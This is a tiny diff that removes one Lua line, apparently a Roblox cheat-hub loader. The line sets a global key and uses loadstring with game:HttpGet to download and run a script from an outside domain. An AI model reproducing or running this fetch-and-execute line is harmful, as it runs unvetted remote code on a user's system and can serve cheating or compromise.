@@ -1,1 +1,0 @@
-_G.Key = "54wext7rTDPENH" loadstring(game:HttpGet("http://fiusen-hub.xyz/hwid.lua"))()
